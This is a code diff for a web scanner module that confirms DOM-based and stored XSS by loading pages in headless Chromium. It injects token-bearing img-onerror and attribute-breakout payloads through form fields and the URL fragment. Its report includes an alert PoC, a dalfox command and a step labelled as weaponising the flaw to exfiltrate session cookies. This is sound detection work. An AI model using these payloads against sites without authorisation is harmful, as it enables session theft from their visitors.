@@ -2,19 +2,22 @@
 dom_xss — browser-verified DOM-based / stored XSS (optional Playwright pass for xss_detect).
 
 The httpx passes in ``xss_detect`` only see server HTML. A payload that the page writes into the DOM
-with client-side JavaScript (e.g. ``el.innerHTML += post.message``) never appears in the server
-response and only *executes* in a real browser — so an HTTP-only scanner is structurally blind to it
-(this is exactly why Google's XSS-game level 2 was missed).
+with client-side JavaScript (``el.innerHTML = …``, ``$(...).html(…)``, a value read from
+``location.hash``) never appears in the server response and only *executes* in a real browser — so an
+HTTP-only scanner is structurally blind to it.
 
-This pass drives headless Chromium: per candidate page it fills the text fields with **benign,
-token-bearing** payloads, submits, re-renders (and reloads, for the stored case), and confirms
-execution by catching a callback from the payload — a unique ``window.__hadesxss(token)`` hook (and a
-wrapped ``alert``/``confirm``/``prompt``). A fired token proves DOM/stored XSS.
+This pass drives headless Chromium and tests two DOM vectors per candidate page:
+  * **URL fragment (#hash)** — loads the page with a token-bearing payload in the hash, catching DOM
+    XSS where client JS reads ``location.hash`` (e.g. Google's XSS-game level 3);
+  * **form fields** — fills the text fields, submits and reloads, catching stored/DOM XSS where a saved
+    value is rendered with client-side JS (e.g. XSS-game level 2).
 
-Detection-only: the payload calls an in-page hook with a random token — no exfiltration, no network
-egress, no persistence beyond the app's own storage. Findings are emitted under ``xss_detect`` so this
-adds no new registered module. Everything is bounded (page/field caps, per-nav timeouts) and every
-failure is swallowed so a browser hiccup never breaks the scan.
+Either way it confirms *execution* by catching a callback from a **benign, token-bearing** payload — a
+unique ``window.__hadesxss(token)`` hook (and a wrapped ``alert``/``confirm``/``prompt``). A fired token
+proves the bug. Detection-only: no exfiltration, no network egress, no persistence beyond the app's own
+storage. Findings are emitted under ``xss_detect`` (no new registered module). Everything is bounded
+(page/field caps, per-nav timeouts) and every failure is swallowed so a browser hiccup never breaks the
+scan.
 """
 from __future__ import annotations
 
@@ -33,19 +36,32 @@ MODULE = "xss_detect"
 _MAX_PAGES = 5          # candidate pages to drive
 _MAX_FIELDS = 3         # text fields to fuzz per page
 _NAV_TIMEOUT_MS = 15000
-_NAV_WAIT = "load"      # wait for window.onload — many apps wire the submit handler there
-_SETTLE_MS = 1800       # let the async save (XHR) + innerHTML re-render run
+_NAV_WAIT = "load"      # wait for window.onload — apps often wire handlers / read the hash there
+_SETTLE_MS = 1800       # form: let the async save (XHR) + re-render run
+_FRAG_SETTLE_MS = 900   # fragment: render is synchronous on load
 
 # Free-text field-name hints worth fuzzing for stored XSS (prioritises pages that have them).
 _TEXTISH = ("message", "comment", "status", "body", "content", "text", "post", "note", "title",
             "subject", "description", "feedback", "review", "search", "q", "query", "name")
 
-# Runs before page scripts on every navigation: defines the hook and wraps the dialog functions.
+# Benign payload templates. {cb} is the callback expression; the second tuple item is the quote the
+# callback's token must use so it does NOT clash with the attribute quote in the template.
+_FORM_TEMPLATE = ('"><img src=x onerror="{cb}">', "'")     # value inserted via innerHTML → break out
+_FRAG_TEMPLATES = (
+    ("x' onerror='{cb}", '"'),              # single-quoted attribute (xss-game level 3)
+    ('x" onerror="{cb}', "'"),              # double-quoted attribute
+    ('<img src=x onerror="{cb}">', "'"),    # raw HTML element / innerHTML
+    ('"><img src=x onerror="{cb}">', "'"),  # attribute → element
+)
+_POC = "alert(document.domain)"             # self-contained PoC (no quotes → safe in any context)
+
+# Runs before page scripts on every navigation: defines the hook + wraps dialogs (capped so a payload
+# that fires on every render — e.g. a multi-image page — can't grow the array without bound).
 _INIT_SCRIPT = """
 window.__hadesxss_hits = window.__hadesxss_hits || [];
-window.__hadesxss = function(t){ try { window.__hadesxss_hits.push(String(t)); } catch(e){} };
+window.__hadesxss = function(t){ try { var a=window.__hadesxss_hits; if(a.length<50) a.push(String(t)); } catch(e){} };
 ['alert','confirm','prompt'].forEach(function(fn){
-  try { window[fn] = function(){ try { window.__hadesxss_hits.push('ALERT:'+arguments[0]); } catch(e){} return true; }; }
+  try { window[fn] = function(){ try { var a=window.__hadesxss_hits; if(a.length<50) a.push('ALERT:'+arguments[0]); } catch(e){} return true; }; }
   catch(e){}
 });
 """
@@ -59,8 +75,10 @@ class DomXssHit:
     url: str
     field: str
     payload: str
-    trigger: str        # "dom-hook" | "alert"
+    trigger: str            # "dom-hook" | "alert"
     token: str
+    vector: str = "form"    # "form" | "fragment"
+    poc: str = ""           # self-contained reproduction (alert) payload / URL
 
 
 def _is_textish(name: str) -> bool:
@@ -68,9 +86,20 @@ def _is_textish(name: str) -> bool:
     return any(h in low for h in _TEXTISH)
 
 
+def _det_payload(template: str, token_quote: str, token: str) -> str:
+    """The detection payload: the template wired to the token-recording hook."""
+    cb = f"window.__hadesxss&&window.__hadesxss({token_quote}{token}{token_quote})"
+    return template.format(cb=cb)
+
+
+def _poc_payload(template: str) -> str:
+    """The self-contained reproduction payload: the same template wired to a visible alert."""
+    return template.format(cb=_POC)
+
+
 def _payload(token: str) -> str:
-    """A benign token-bearing payload for the common innerHTML sink (img onerror is universal)."""
-    return f'"><img src=x onerror="window.__hadesxss && window.__hadesxss(\'{token}\')">'
+    """Detection payload for a form field (value inserted via innerHTML)."""
+    return _det_payload(_FORM_TEMPLATE[0], _FORM_TEMPLATE[1], token)
 
 
 # ---------------------------------------------------------------------------
@@ -137,6 +166,30 @@ def _submit(page: Any, field: Any) -> None:
         pass
 
 
+def _verify_fragment(context: Any, url: str) -> DomXssHit | None:
+    """Load *url* with token-bearing payloads in the #fragment; report the first that executes."""
+    base = url.split("#")[0]
+    for template, token_quote in _FRAG_TEMPLATES:
+        token = uuid.uuid4().hex[:12]
+        payload = _det_payload(template, token_quote, token)
+        page = context.new_page()
+        try:
+            page.goto(base + "#" + payload, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
+            page.wait_for_timeout(_FRAG_SETTLE_MS)
+            trigger = _fired_token(page, token)
+            if trigger:
+                return DomXssHit(url=base, field="URL fragment (#)", payload=payload, trigger=trigger,
+                                 token=token, vector="fragment", poc=base + "#" + _poc_payload(template))
+        except Exception as exc:  # noqa: BLE001
+            logger.debug(f"dom_xss: fragment probe {base} failed: {exc}")
+        finally:
+            try:
+                page.close()
+            except Exception:  # noqa: BLE001
+                pass
+    return None
+
+
 def _verify_field(context: Any, url: str, index: int) -> DomXssHit | None:
     """Fill the *index*-th text field on a fresh load of *url*, submit, reload, check for a fire."""
     page = context.new_page()
@@ -162,7 +215,8 @@ def _verify_field(context: Any, url: str, index: int) -> DomXssHit | None:
             except Exception:  # noqa: BLE001
                 pass
         if trigger:
-            return DomXssHit(url=url, field=name, payload=payload, trigger=trigger, token=token)
+            return DomXssHit(url=url, field=name, payload=payload, trigger=trigger, token=token,
+                             vector="form", poc=_poc_payload(_FORM_TEMPLATE[0]))
         return None
     finally:
         try:
@@ -200,6 +254,16 @@ def verify(engine: ScanEngine, pages: list[str]) -> list[DomXssHit]:
             try:
                 context.add_init_script(_INIT_SCRIPT)
                 for url in pages[:_MAX_PAGES]:
+                    # 1) URL-fragment vector (no form needed) — one strong finding per page is enough.
+                    try:
+                        frag = _verify_fragment(context, url)
+                    except Exception as exc:  # noqa: BLE001
+                        logger.debug(f"dom_xss: fragment {url} failed: {exc}")
+                        frag = None
+                    if frag:
+                        hits.append(frag)
+                        continue
+                    # 2) Form-field vector (stored / DOM).
                     seen_fields: set[str] = set()
                     n = min(_field_count(context, url), _MAX_FIELDS)
                     for i in range(n):
@@ -223,25 +287,35 @@ def verify(engine: ScanEngine, pages: list[str]) -> list[DomXssHit]:
 # ---------------------------------------------------------------------------
 
 def to_finding(hit: DomXssHit) -> Finding:
-    where = f"form field '{hit.field}' on {hit.url}"
-    desc = (f"A benign token payload submitted to {where} executed in a real browser "
-            f"(trigger: {hit.trigger}) after the page rendered it with client-side JavaScript. "
-            "This is a DOM-based / stored XSS: the value is written into the DOM (e.g. innerHTML) and "
-            "runs whenever the page is viewed — invisible to HTTP-only checks because it never appears "
-            "in the server response.")
+    if hit.vector == "fragment":
+        where = f"the URL fragment (#) of {hit.url}"
+        sink = "client-side JS reads location.hash and writes it into the DOM"
+        repro_desc = ("Reproduce in any browser — load this URL; the payload runs when the page reads "
+                      "location.hash. (Hades detected it with a benign hook — see the evidence box for "
+                      "the exact payload it fired.)")
+        repro_cmd = hit.poc or hit.url
+        title_what = "URL fragment (#)"
+    else:
+        where = f"form field '{hit.field}' on {hit.url}"
+        sink = "the saved value is written into the DOM (e.g. innerHTML) and runs when the page renders"
+        repro_desc = (f"Reproduce in any browser — submit this self-contained PoC into the '{hit.field}' "
+                      f"field at {hit.url}; it fires when the value renders. (Hades detected it with a "
+                      "benign hook — see the evidence box for the exact payload it fired.)")
+        repro_cmd = hit.poc or '<img src=x onerror="alert(document.domain)">'
+        title_what = hit.field
+
+    desc = (f"A benign token payload injected at {where} executed in a real browser (trigger: "
+            f"{hit.trigger}) — {sink}. This is a DOM-based XSS: it runs in the browser and never appears "
+            "in the server response, so HTTP-only checks miss it.")
     raw = {
-        "location": where, "url": hit.url, "field": hit.field, "payload": hit.payload,
-        "trigger": hit.trigger, "confidence": "high", "verified": "browser",
+        "location": where, "url": hit.url, "field": hit.field, "vector": hit.vector,
+        "payload": hit.payload, "trigger": hit.trigger, "confidence": "high", "verified": "browser",
         "evidence": [
-            f"submitted to '{hit.field}': {hit.payload}",
-            f"payload executed in headless Chromium on {hit.url} (trigger: {hit.trigger}, token {hit.token})",
+            f"injected at {where}: {hit.payload}",
+            f"payload executed in headless Chromium (trigger: {hit.trigger}, token {hit.token})",
         ],
         "exploitation": [
-            {"step": 1, "description": (f"Reproduce in any browser — submit this self-contained PoC into "
-                                        f"the '{hit.field}' field at {hit.url}; it fires when the stored "
-                                        "value renders. (Hades detected it with a benign hook instead of "
-                                        "alert — see the evidence box for the exact payload it fired.)"),
-             "command": '<img src=x onerror="alert(document.domain)">'},
+            {"step": 1, "description": repro_desc, "command": repro_cmd},
             {"step": 2, "description": "Auto-discover working payloads / confirm with dalfox.",
              "command": f'dalfox url "{hit.url}"'},
             {"step": 3, "description": "Weaponise: exfiltrate the viewer's session cookie.",
@@ -250,11 +324,11 @@ def to_finding(hit: DomXssHit) -> Finding:
     }
     return Finding(
         module=MODULE,
-        title=f"DOM-based / Stored XSS (browser-verified): {hit.field}",
+        title=f"DOM-based XSS (browser-verified): {title_what}",
         description=desc,
         severity=Severity.HIGH,
-        recommendation=("Never write untrusted input with innerHTML — use textContent or a safe "
-                        "templating layer that auto-escapes; context-encode on output and add a strict "
-                        "Content-Security-Policy that forbids inline event handlers."),
+        recommendation=("Never write untrusted input (form values, URL/location.hash) with innerHTML — "
+                        "use textContent or a safe templating layer that auto-escapes; context-encode on "
+                        "output and add a strict Content-Security-Policy that forbids inline handlers."),
         raw=raw,
     )
